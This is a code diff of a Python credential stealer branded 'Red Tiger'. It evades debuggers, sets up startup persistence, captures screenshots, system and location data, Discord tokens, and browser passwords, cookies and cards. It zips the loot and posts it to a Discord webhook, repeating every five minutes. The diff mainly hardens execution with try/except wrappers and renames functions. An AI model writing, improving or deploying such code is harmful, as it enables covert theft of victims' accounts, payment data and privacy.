@@ -1,5 +1,5 @@
+from Config.Util import *
 from Config.Config import *
-
 import random
 import os
 import subprocess
@@ -173,6 +173,7 @@ from win32crypt import CryptUnprotectData
 from typing import Literal
 import uuid
 from PIL import ImageGrab
+import time
 
 class AntiDebug:
     def __init__(self) -> None:
@@ -234,16 +235,18 @@ class AntiDebug:
             if hwid in i or username in i or hostname in i:
                 return True
 try:
- AntiDebug()
+    AntiDebug()
 except:
     ()
-now = now = datetime.now()
-hour = now.hour
-minute = now.minute
-second = now.second
-day = now.day
-month = now.month
-year = now.year
+
+from datetime import datetime
+
+# Fonction pour obtenir l'heure, la minute, la seconde, l'année, le jour et le mois actuels
+def get_current_datetime():
+    now = datetime.now()
+    return now.hour, now.minute, now.second, now.year, now.day, now.month
+
+hour, minute, second, year, day, month = get_current_datetime()
 
 color_embed = 0xB20000
 username_embed = 'Red Tiger'
@@ -391,7 +394,6 @@ class Startup:
 
 
 class System_Info:
-
     try:
         system_info = {platform.system()}
     except:
@@ -610,12 +612,11 @@ State    : "{state}"
 Postal   : "{postal}"
 City     : "{city}"```""", "inline": False},
 
-#{"name": f"", "value": f"""```{}```""", "inline": False},
 ] 
     embed_system(webhook_url, title, fields, color_embed, footer_embed, username_embed, avatar_embed)
 
 
-def screenshot(webhook_url):
+def Screenshot(webhook_url):
     try:
         embed = Embed(title=f":desktop: | Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
 
@@ -1037,7 +1038,6 @@ __CARDS__ = []
 
 
 class Browsers_Info:
-
     def __init__(self, webhook):
         self.webhook = SyncWebhook.from_url(webhook)
 
@@ -1057,7 +1057,7 @@ class Upload:
     def write_files(self):
         os.makedirs(f"Browsers_{username_pc}", exist_ok=True)
         if __LOGINS__:
-            with open(f"Browsers_{username_pc}\\browsers_{username_pc}_logins.txt", "w", encoding="utf-8") as f:
+            with open(f"Browsers_{username_pc}\\browsers_{username_pc}_passwords.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __LOGINS__))
 
         if __COOKIES__:
@@ -1079,7 +1079,6 @@ class Upload:
         with ZipFile(f"Browsers_{username_pc}.zip", "w") as zip:
             for file in os.listdir(f"Browsers_{username_pc}"):
                 zip.write(f"Browsers_{username_pc}\\{file}", file)
-
     def send(self):
         self.webhook.send(
             embed=Embed(
@@ -1121,7 +1120,7 @@ class Upload:
                 yield from self.tree(path, prefix=prefix+extension)
             else:
                 yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
-
+    
 
 class Chromium:
 
@@ -1372,10 +1371,22 @@ class Types:
 
         def __repr__(self):
             return self.__str__()
-
-System_Info()
-screenshot(webhook_url)
-Discord_Info(webhook_url)
+try:
+    Startup()
+except:
+    ()
+try:
+    System_Info()
+except:
+    ()
+try:
+    Screenshot(webhook_url)
+except:
+    ()
+try:
+    Discord_Info(webhook_url)
+except:
+    ()
 try:
     Browsers_Info(webhook_url)
 except:
@@ -1387,22 +1398,30 @@ payload = {
     'avatar_url': avatar_embed,
 }
 requests.post(webhook_url, json=payload)
-import time
 
 while True:
+
     time.sleep(300)
+
     payload = {
     'content': f'****╔════════════════════Injection═══════════════════╗****',
     'username': username_embed,
     'avatar_url': avatar_embed,
     }
     requests.post(webhook_url, json=payload)
+
     try:
-     AntiDebug()
+        AntiDebug()
     except:
         ()
-    screenshot(webhook_url)
-    Discord_Info(webhook_url)
+    try:
+        Screenshot(webhook_url)
+    except:
+        ()
+    try:
+        Discord_Info(webhook_url)
+    except:
+        ()
     try:
         Browsers_Info(webhook_url)
     except:
